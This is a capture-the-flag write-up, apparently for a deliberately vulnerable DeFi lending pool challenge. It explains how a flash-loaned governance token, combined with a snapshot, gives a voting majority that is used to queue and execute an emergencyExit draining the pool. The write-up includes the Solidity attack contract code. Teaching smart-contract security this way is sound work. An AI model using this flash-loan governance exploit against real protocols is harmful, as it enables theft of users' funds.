> A new cool lending pool has launched!
> It’s now offering flash loans of DVT tokens.
> It even includes a fancy governance mechanism to control it.

> What could go wrong, right ?

> You start with no DVT tokens in balance, and the pool has 1.5 million.
> Your goal is to take them all.

## Becoming a governor

The web3 version of traditional `admin` users are the `governance` adresses.
And they really have all the powers:

```solidity
(bool success, bytes memory returndata) = actionToExecute.target.call{value: actionToExecute.value}(actionToExecute.data);
```

To be executed, an `action` has to be queued first, which requires "votes":

```solidity
if (!_hasEnoughVotes(msg.sender))
    revert NotEnoughVotes(msg.sender);
```

```solidity
function _hasEnoughVotes(address who) private view returns (bool) {
    uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);
    uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;
    return balance > halfTotalSupply;
}
```

It requires to have more than half the supply of governance tokens!
(which means there can only be one admin...)

In theory the token for the underlying asset is distinguished from the token used in governance.
And the pool proposes flash loans of the underlying assets.

Luckily, the governance counts the shares in the underlying asset:

```js
governance = await (await ethers.getContractFactory('SimpleGovernance', deployer)).deploy(token.address);
```

So we can just borrow these:

```solidity
function getVotes() public {
    // borrow the maximum
    uint256 _amount = _pool.maxFlashLoan(address(_underlying));
    _pool.flashLoan(IERC3156FlashBorrower(address(this)), address(_underlying), _amount, "");
}
```

However, executing the attack chain like this will throw with `NotEnoughVotes`.
This is due to the fact that the governance contract checks the balance at the previous snapshot:

```solidity
uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);
```

So we have to take a snapshot first (hence the name):

```solidity
_underlying.snapshot();
```

## Sweeping the rug

Now that the contract has enough votes / balance, it can queue the actual action:

```solidity
function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external returns (bytes32) {
    // a decent contract would check the args here

    // take a snapshot of the underlying balances
    _underlying.snapshot();

    // queue the emergencyExit action
    bytes memory _payload = abi.encodeWithSignature("emergencyExit(address)", _player);
    _id = _governance.queueAction(address(_pool), 0, _payload);

    // payback the loan
    _underlying.approve(msg.sender, amount);

    // protocol
    return CALLBACK_SUCCESS;
}
```

Governance proposals are frozen for 2 days (so that the community has time to discuss them):

```solidity
unchecked {
    timeDelta = uint64(block.timestamp) - actionToExecute.proposedAt;
}

return actionToExecute.executedAt == 0 && timeDelta >= ACTION_DELAY_IN_SECONDS;
```

So we wait and then execute it:

```solidity
function getFunds() public {
    // execute the emergency exit action
    _governance.executeAction(_id);
}
```
